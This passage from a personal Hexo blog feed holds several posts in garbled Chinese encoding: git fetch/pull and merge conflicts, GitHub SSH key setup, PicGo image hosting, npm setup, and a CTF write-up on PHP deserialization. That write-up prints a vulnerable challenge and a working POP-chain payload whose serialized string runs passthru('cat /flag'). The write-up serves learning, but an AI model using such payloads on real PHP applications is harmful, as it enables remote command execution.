plaintext">git@gitee.com:ljc0033/git_test.git<br></code></pre></td></tr></table></figure><p>å°±ä¼šå–git_testä½œä¸ºç›®å½•å</p><p><strong>æŠ“å–å’Œæ‹‰å–</strong></p><ul><li><p>æŠ“å–æŒ‡ä»¤ï¼šgit fetch [remote name] [branch name]</p><p>æŠ“å–å°±æ˜¯å°†ä»“åº“é‡Œçš„æ›´æ–°éƒ½æŠ“å–åˆ°æœ¬åœ°ï¼Œä¸ä¼šè¿›è¡Œåˆå¹¶</p><p>å¦‚æœä¸æŒ‡å®šè¿œç«¯åç§°å’Œåˆ†æ”¯åï¼Œåˆ™æŠ“å–æ‰€æœ‰åˆ†æ”¯</p></li><li><p>æ‹‰å–å‘½ä»¤ï¼šgit pull [remote name] [branch name]</p><p>æ‹‰å–å°±æ˜¯å°†è¿œç«¯ä»“åº“çš„ä¿®æ”¹æ‹‰åˆ°æœ¬åœ°å¹¶è‡ªåŠ¨è¿›è¡Œåˆå¹¶ï¼Œç­‰åŒäºfetch+merge</p><p>å¦‚æœä¸æŒ‡å®šè¿œç«¯åç§°å’Œåˆ†æ”¯åï¼Œåˆ™æŠ“å–æ‰€æœ‰å¹¶æ›´æ–°å½“å‰åˆ†æ”¯</p></li></ul><p><img src="http://cdn.clown2024.cn/202407151440110.png" alt="image-20240125213127428"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°fetchä¹‹åçš„åˆ†æ”¯å¹¶æ²¡æœ‰åˆå¹¶åˆ°å½“å‰çš„masterï¼Œæ¥ä¸‹æ¥å†è¿›è¡Œ git merge origin&#x2F;master<img src="http://cdn.clown2024.cn/202407151440111.png" alt="image-20240125213243273"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸåˆå¹¶äº†(è¿™é‡Œå¯ä»¥å†™ä¸Šåˆ†æ”¯å)ï¼Œgit pullå°±ç›¸å½“äºåˆå¹¶äº†è¿™ä¸¤æ­¥</p><h3 id="è§£å†³å†²çª"><a href="#è§£å†³å†²çª" class="headerlink" title="è§£å†³å†²çª"></a>è§£å†³å†²çª</h3><p>å½“Aå’ŒBä¿®æ”¹åŒä¸€ä¸ªæ–‡ä»¶æ—¶ä¼šå‡ºç°å†²çªï¼Œè¿™é‡Œæ¨¡æ‹Ÿä¸€ä¸‹åŒæ—¶ä¿®æ”¹file01.txtæ–‡ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªå…ˆæäº¤<img src="http://cdn.clown2024.cn/202407151440112.png" alt="image-20240125214924391"></p><p><img src="http://cdn.clown2024.cn/202407151440113.png" alt="image-20240125215448663"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°å³è¾¹æƒ³è¦è¿›è¡Œåˆå¹¶å‡ºç°äº†å†²çªï¼Œå› ä¸ºä¿®æ”¹äº†åŒä¸€å—åœ°æ–¹ï¼Œå†çœ‹ä¸€ä¸‹file01.txtçš„å†…å®¹<img src="http://cdn.clown2024.cn/202407151440114.png" alt="image-20240125215616774"></p><p>ä¸Šé¢çš„æ˜¯æˆ‘ä»¬å½“å‰åˆ†æ”¯ï¼Œä¸‹é¢çš„æ˜¯è¿œç«¯åˆ†æ”¯ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æœ¬åœ°æŠŠä»–ä¿®æ”¹æˆ‘ä»¬æƒ³è¦çš„æ ·å­ç„¶åæäº¤å†åˆå¹¶å°±å¯ä»¥äº†ï¼Œæ¯”å¦‚è¿™æ ·<img src="http://cdn.clown2024.cn/202407151440115.png" alt="image-20240125215801079"></p><p><img src="http://cdn.clown2024.cn/202407151440116.png" alt="image-20240125215928798"></p><h2 id="gitç»‘å®šgithubè´¦å·"><a href="#gitç»‘å®šGitHubè´¦å·" class="headerlink" title="gitç»‘å®šGitHubè´¦å·"></a>gitç»‘å®šGitHubè´¦å·</h2><ol><li><pre><code>git config --global --list  //æŸ¥çœ‹è‡ªå·±çš„ç”¨æˆ·åå’Œé‚®ç®±ï¼Œæ³¨æ„è¦å’Œgithubä¿æŒä¸€è‡´//å¦‚æœä¸ä¸€è‡´åˆ™è‡ªå·±å»è®¾ç½®<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"><br>2. ```<br>   ssh-keygen -t rsa -C &quot;è‡ªå·±çš„é‚®ç®±&quot;//è¿™é‡Œç”Ÿæˆsshçš„å¯†é’¥ï¼Œä¼šé»˜è®¤åœ¨~/.sshç›®å½•ä¸‹é¢<br></code></pre></td></tr></table></figure>å¯ä»¥çœ‹åˆ°æœ‰ä¸‹åˆ—æ–‡ä»¶ï¼š![image-20231103174934422](http://cdn.clown2024.cn/202407151440117.png)</code></pre></li><li><p>å›åˆ°githubä»“åº“æ·»åŠ å¯†é’¥</p></li></ol><p><img src="http://cdn.clown2024.cn/202407151440118.png" alt="image-20231103175102389"></p><p>ç„¶åå¤åˆ¶.sshä¸‹é¢çš„.pubå…¬é’¥åˆ°ä¸‹é¢çš„keyä¸­<img src="http://cdn.clown2024.cn/202407151440119.png" alt="image-20231103175214763"></p><ol start="4"><li><pre><code>ssh -T git@github.com //æµ‹è¯•æ˜¯å¦è¿é€š</code></pre><p>å‡ºç°ä¸‹é¢çš„ç»“æœå³ä»£è¡¨æˆåŠŸ<img src="http://cdn.clown2024.cn/202407151440120.png" alt="image-20231103175607799"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–</title>
      <link href="/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹ååºåˆ—åŒ–ç›¸å…³çš„å‡½æ•°</p><p>è¿™ç¯‡æ–‡ç« è›®å¥½çš„ï¼š<a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-ååºåˆ—åŒ–ï¼ˆè¶…ç»†çš„ï¼‰ | spacemanâ€™blog (gitee.io)</a></p><p><strong>å¸¸è§çš„é­”æœ¯æ–¹æ³•</strong></p><ul><li><p>__construct() :å½“å¯¹è±¡è¢«åˆ›å»ºæ—¶è§¦å‘</p></li><li><p>__destruct() :å½“å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</p></li><li><p>__toString() :å½“å¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</p></li><li><p>__sleep() :åºåˆ—åŒ–å¯¹è±¡å‰è°ƒç”¨ï¼ˆå…¶è¿”å›éœ€è¦æ˜¯ä¸€ä¸ªæ•°ç»„ï¼‰</p></li><li><p>__wakeup() :ååºåˆ—åŒ–æ¢å¤å¯¹è±¡å‰è°ƒç”¨ï¼Œå½“å­—ç¬¦ä¸²è¡¨ç¤ºçš„å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºçœŸå®ä¸ªæ•°æ—¶ä¼šè·³è¿‡è¯¥å‡½æ•°æ‰§è¡Œ</p></li><li><p>__call() :å½“è°ƒç”¨å¯¹è±¡ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨</p></li><li><p>__get() :ä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æ—¶è°ƒç”¨,æˆ–è€…ä¸å­˜åœ¨çš„å±æ€§</p></li><li><p>__invoke() :æŠŠä¸€ä¸ªå®ä¾‹å¯¹è±¡å½“ä½œå‡½æ•°ä½¿ç”¨æ—¶è¢«è°ƒç”¨</p></li><li><p>__clone() : è¿›è¡Œå¯¹è±¡cloneæ—¶è¢«è°ƒç”¨ï¼Œç”¨æ¥è°ƒæ•´å¯¹è±¡çš„å…‹éš†è¡Œä¸º</p></li><li><p>__callStatic() :è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨</p></li><li><p>__isset() :åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨ isset() æˆ– empty() æ—¶è§¦å‘</p></li><li><p>__set() :å½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨</p></li><li><p>__unset() :åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨ unset() æ—¶è§¦å‘</p></li><li><p>__ set_state() :</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">å½“è°ƒç”¨ var_export() å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•è¢«è°ƒç”¨ã€‚ç”¨ __set_state() çš„è¿”å›å€¼åšä¸º var_export() çš„è¿”å›å€¼<br></code></pre></td></tr></table></figure></li><li><p>__debuginfo() :å½“è°ƒç”¨ var_dump() æ‰“å°å¯¹è±¡æ—¶è¢«è°ƒç”¨ï¼ˆå½“ä½ ä¸æƒ³æ‰“å°æ‰€æœ‰å±æ€§ï¼‰ï¼Œé€‚ç”¨äºPHP5.6ç‰ˆæœ¬</p></li></ul><p><strong>phpä»£ç æ‰§è¡Œæœ‰å…³çš„å‡½æ•°</strong></p><ul><li><p>eval()å‡½æ•°ï¼šä¼šå°†å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œéœ€è¦ä»¥åˆ†å·ç»“å°¾ï¼Œä½†æ¯”è¾ƒç‰¹æ®Šçš„æ˜¯å®ƒä¸èƒ½è¢«å½“ä½œå˜é‡æ‰§è¡Œï¼Œä¾‹å¦‚ï¼š$a(â€œphpinfo();â€),aä¸ºâ€™evalâ€™ï¼›è¿™æ ·å­ä¼šæŠ¥å‡½æ•°æœªå®šä¹‰çš„é”™è¯¯ã€‚</p><p>è¿™é‡Œå»äº†è§£ä¸€ä¸‹å‘ç°ï¼ševalæ˜¯å› ä¸ºæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ã€‚</p><blockquote><p>å¯å˜å‡½æ•°å³å˜é‡ååŠ æ‹¬å·ï¼ŒPHPç³»ç»Ÿä¼šå°è¯•è§£ææˆå‡½æ•°ï¼Œå¦‚æœæœ‰å½“å‰å˜é‡ä¸­çš„å€¼ä¸ºå‘½åçš„å‡½æ•°ï¼Œå°±ä¼šè°ƒç”¨ã€‚å¦‚æœæ²¡æœ‰å°±æŠ¥é”™ã€‚<br>å¯å˜å‡½æ•°ä¸èƒ½ç”¨äºä¾‹å¦‚ï¼šechoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequire eval() ä»¥åŠç±»ä¼¼çš„è¯­è¨€ç»“æ„ã€‚éœ€è¦ä½¿ç”¨è‡ªå·±çš„åŒ…è£…å‡½æ•°æ¥å°†è¿™äº›ç»“æ„ç”¨ä½œå¯å˜å‡½æ•°ã€‚</p></blockquote></li><li><p>assert()å‡½æ•°ï¼šä¹Ÿæ˜¯å°†å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œä¸éœ€è¦ä»¥åˆ†å·ç»“å°¾ï¼Œä½†åœ¨php7.1ç‰ˆæœ¬åå°±é»˜è®¤ä¸å†å¯ä»¥æ‰§è¡Œä»£ç äº†</p></li></ul><p><strong>å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•°</strong></p><ul><li>system()å‡½æ•°ï¼šå°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œè‡ªå¸¦è¾“å‡ºåŠŸèƒ½ã€‚</li><li>passthru()å‡½æ•°ï¼šå°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œä¸éœ€è¦è¾“å‡ºæ‰§è¡Œç»“æœï¼Œä¸”è¾“å‡ºå…¨éƒ¨çš„å†…å®¹ã€‚</li><li>exec()å‡½æ•°ï¼šå°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦è¾“å‡ºæ‰§è¡Œç»“æœï¼Œæ¯”å¦‚ä½¿ç”¨echoå°†ä»–æ‰“å°å‡ºæ¥ï¼Œä¸”å®ƒåªä¼šè¾“å‡ºæœ€åä¸€è¡Œçš„å†…å®¹ã€‚</li><li>shell_exec()ï¼šå°†å­—ç¬¦ä¸²ä½œä¸ºOSå‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦è¾“å‡ºæ‰§è¡Œç»“æœï¼Œä¸”è¾“å‡ºå…¨éƒ¨çš„å†…å®¹ã€‚</li><li>åå¼•å·&#96;&#96;ï¼šé‡Œé¢çš„ä»£ç ä¹Ÿä¼šå½“ä½œOSå‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦è¾“å‡ºæ‰§è¡Œç»“æœã€‚</li><li>popen()&#x2F;proc_open()å‡½æ•°ï¼šè¯¥å‡½æ•°ä¹Ÿå¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œOSå‘½ä»¤æ¥æ‰§è¡Œï¼Œä½†æ˜¯è¯¥å‡½æ•°è¿”å›çš„æ˜¯æ–‡ä»¶æŒ‡é’ˆè€Œéå‘½ä»¤æ‰§è¡Œç»“æœã€‚è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ã€‚</li></ul><p><code>ä»¥GeekGameçš„ä¸€é¢˜ä¸ºä¾‹æ¥è¿›è¡Œå­¦ä¹ ï¼š</code></p><h1 id="unsign"><a href="#unsign" class="headerlink" title="unsign"></a>unsign</h1><p>é¢˜ç›®çš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) <br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥åˆ†æçŸ¥é“æœ‰ä¸‰ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ†åˆ«æ˜¯ï¼š**__destruct()<strong>,</strong>__invoke()<strong>,</strong>__get()**ã€‚</p><p>æœ€ç»ˆæˆ‘ä»¬æ˜¯è¦è¿›å…¥$eva1 é‡Œé¢è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥å…ˆç»™eva1å’Œinterestingå˜é‡è¿›è¡Œèµ‹å€¼ï¼Œæ³¨æ„ä¸èƒ½èµ‹å€¼evalï¼Œå› ä¸ºevalä¸èƒ½åŠ¨æ€è°ƒç”¨ï¼Œç„¶åè¿™æ˜¯è¦è¿›å…¥åˆ°**__get()<strong>æ–¹æ³•ä¸­æ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå†ç½‘ä¸Šçœ‹èƒ½çœ‹åˆ°loverç±»é‡Œé¢è¿”å›äº†å˜é‡ï¼Œå³æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™é‡Œè®¿é—®webçš„å®ä¾‹å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§ä»è€Œè§¦å‘</strong>__get()<strong>æ–¹æ³•ï¼Œçœ‹åˆ°æœ€åè®¿é—®çš„æ˜¯QWå˜é‡ï¼Œé‚£åªè¦è®¾ç½®ä¸€ä¸ªwebå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§å³å¯ï¼›è¦è®¿é—®è¯¥å±æ€§ï¼Œæˆ‘ä»¬åˆè¦è§¦å‘</strong>__invoke()<strong>æ–¹æ³•ï¼Œçœ‹åˆ°æœ‰sycçš„</strong>__destruct()**æ–¹æ³•è¿”å›äº†ä¸€ä¸ªå˜é‡å½“ä½œå‡½æ•°ï¼Œé‚£æˆ‘ä»¬ç»™è¿™ä¸ªå˜é‡ä¼ å…¥loverå¯¹è±¡å³å¯ï¼›</p><p>æ‰€ä»¥è°ƒç”¨é“¾ä¸ºè¿™æ ·ï¼š**__destruct()<strong>&#x3D;&gt;</strong>__invoke()<strong>&#x3D;&gt;</strong>__get()**</p><p>payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">syc</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cuit</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;action!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$function</span>=<span class="hljs-variable language_">$this</span>-&gt;cuit;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lover</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$yxx</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$QW</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;invoke!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;yxx-&gt;QW;<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eva1</span>=<span class="hljs-string">&#x27;passthru&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$interesting</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;get!&lt;br&gt;&quot;</span>);<br>        <span class="hljs-variable">$eva1</span>=<span class="hljs-variable language_">$this</span>-&gt;eva1;<br>        <span class="hljs-variable">$eva1</span>(<span class="hljs-variable language_">$this</span>-&gt;interesting);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">syc</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lover</span>();<br><span class="hljs-variable">$a</span>-&gt;cuit-&gt;yxx=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">web</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;O:3:&quot;syc&quot;:1:&#123;s:4:&quot;cuit&quot;;O:5:&quot;lover&quot;:2:&#123;s:3:&quot;yxx&quot;;O:3:&quot;web&quot;:2:&#123;s:4:&quot;eva1&quot;;s:8:&quot;passthru&quot;;s:11:&quot;interesting&quot;;s:9:&quot;cat /flag&quot;;&#125;s:2:&quot;QW&quot;;s:4:&quot;test&quot;;&#125;&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é…ç½®GitHubå›¾åºŠ</title>
      <link href="/2023/11/03/%E9%85%8D%E7%BD%AEGitHub%E5%9B%BE%E5%BA%8A/"/>
      <url>/2023/11/03/%E9%85%8D%E7%BD%AEGitHub%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="é‡‡ç”¨picgoæ¥é…ç½®githubå›¾åºŠ"><a href="#é‡‡ç”¨PicGoæ¥é…ç½®GitHubå›¾åºŠ" class="headerlink" title="é‡‡ç”¨PicGoæ¥é…ç½®GitHubå›¾åºŠ"></a>é‡‡ç”¨PicGoæ¥é…ç½®GitHubå›¾åºŠ</h1><p>è½¬åˆ°picgoçš„GitHubå›¾åºŠè®¾ç½®æ¥çœ‹é…ç½®ä¿¡æ¯ï¼š</p><ol><li>æˆ‘ä»¬æ–°å»ºä¸€ä¸ªä»“åº“æ¥å­˜æ”¾å›¾ç‰‡ï¼Œæ¯”å¦‚æˆ‘å¼€äº†ä¸€ä¸ªimageçš„ä»“åº“ï¼Œé‚£æ ¼å¼å°±ä¸º&lt;githubç”¨æˆ·å&gt;&#x2F;image</li><li>åˆ†æ”¯åä»¥å‰é»˜è®¤æ˜¯masterï¼Œç°åœ¨æ˜¯mainï¼Œå¦‚æœä¸åˆ›å»ºå…¶ä»–åˆ†æ”¯å¡«mainå°±å¥½</li></ol><p><img src="http://cdn.clown2024.cn/202407151712977.jpg" alt="picgo2"></p><ol start="3"><li>tokenæ˜¯æœ€é‡è¦çš„ä¸€æ­¥ï¼Œç”¨æ¥è¯†åˆ«ä½ çš„èº«ä»½ï¼Œåˆ›å»ºtokençš„æ—¶å€™ä¸€å®šè¦å‹¾é€‰repoé€‰é¡¹ä¸ç„¶ä¼šä¸Šä¼ å¤±è´¥ï¼ŒæŠ¥å„ç§æƒé™ä¸è¶³ã€‚ã€‚ã€‚</li></ol><p><img src="http://cdn.clown2024.cn/202407151712978.jpg" alt="picgo1"></p><ol start="4"><li>æœ€ååœ¨å›¾åºŠä¸Šé¢ä¸Šä¼ ä¸€å¼ å›¾ç‰‡çœ‹æ˜¯å¦èƒ½æˆåŠŸ</li></ol><p>å¦‚æœè¦å’Œtyporaä¸€èµ·ç”¨ç›´æ¥åœ¨åå¥½è®¾ç½®ä¸­è®¾ç½®ä½¿ç”¨picgoä¸Šä¼ å³å¯ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151712979.png" alt="image-20231103224740889"></p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo blog æ­å»º</title>
      <link href="/2023/11/03/hexo-%E6%90%AD%E5%BB%BAblog/"/>
      <url>/2023/11/03/hexo-%E6%90%AD%E5%BB%BAblog/</url>
      
        <content type="html"><![CDATA[<p>è¿™ç¯‡æ–‡ç« è®°å½•ä¸€ä¸‹blogçš„æ­å»º</p><h1 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h1><ol><li>githubè´¦å·</li><li>å®‰è£…git</li><li>å®‰è£…nodejs</li></ol><p>è¿™äº›å®‰è£…æ‰¾ä¸ªæ•™ç¨‹å³å¯</p><h2 id="npmä¿®æ”¹å…¨å±€åŒ…ä½ç½®"><a href="#npmä¿®æ”¹å…¨å±€åŒ…ä½ç½®" class="headerlink" title="npmä¿®æ”¹å…¨å±€åŒ…ä½ç½®"></a>npmä¿®æ”¹å…¨å±€åŒ…ä½ç½®</h2><p>è¿™é‡Œæ˜¯ä¸ºäº†ä¸å ç”¨cç›˜çš„ç©ºé—´ï¼Œnpmå®‰è£…çš„åŒ…é»˜è®¤åœ¨cç›˜</p><p>è¿™é‡Œäº†è§£äº†å‡ ä¸ªå‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm root -g           // æŸ¥çœ‹å…¨å±€åŒ…çš„å®‰è£…ç›®å½•<br>npm list -g --depth 0 // æŸ¥çœ‹å…¨å±€å®‰è£…è¿‡çš„åŒ…<br></code></pre></td></tr></table></figure><blockquote><p>npm listå‘½ä»¤å¯èƒ½ä¼šæŠ¥é”™ï¼Œè¿™æ—¶å€™æ›´æ–°ä¸€ä¸‹npmå°±å¯ä»¥äº†</p><p>npm update -g â€“verbose</p></blockquote><p>npmå®‰è£…åˆ†ä¸ºä¸¤ç±»ï¼šå…¨å±€åŒ…å’Œé¡¹ç›®åŒ…</p><p>å…¨å±€å®‰è£…: åŒ…è¢«å®‰è£…åˆ°äº†ç³»ç»Ÿç›®å½•ï¼ˆä¸€èˆ¬åœ¨ç³»ç»Ÿç›˜çš„node_modulesä¸­ï¼‰ã€‚</p><ul><li>å‘½ä»¤ï¼š<code>npm install -g åŒ…å</code> æˆ–è€… <code>npm install åŒ…å -g</code></li></ul><p>é¡¹ç›®å®‰è£…ï¼ˆæˆ–è€…å«æœ¬åœ°å®‰è£…)ï¼ŒåŒ…å®‰è£…åœ¨å½“å‰é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹ï¼ˆä¸package.jsonåŒçº§ï¼‰çš„node_modulesä¸­ã€‚</p><ul><li>å‘½ä»¤ï¼š<code>npm install åŒ…å</code></li></ul><p>æ­¥éª¤ï¼š</p><ol><li><p>åœ¨è¦å®‰è£…ä¾èµ–çš„ç›®å½•ä¸‹æ–°å»ºä¸¤ä¸ªæ–‡ä»¶å¤¹</p><p><img src="http://cdn.clown2024.cn/202407151510139.png"></p><ol start="2"><li><p>åœ¨cmdä¸­æ‰§è¡Œä¸‹é¢ä¸¤æ¡æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">npm config set prefix&quot;nodeglobalè·¯å¾„&quot;<br>npm config set cache 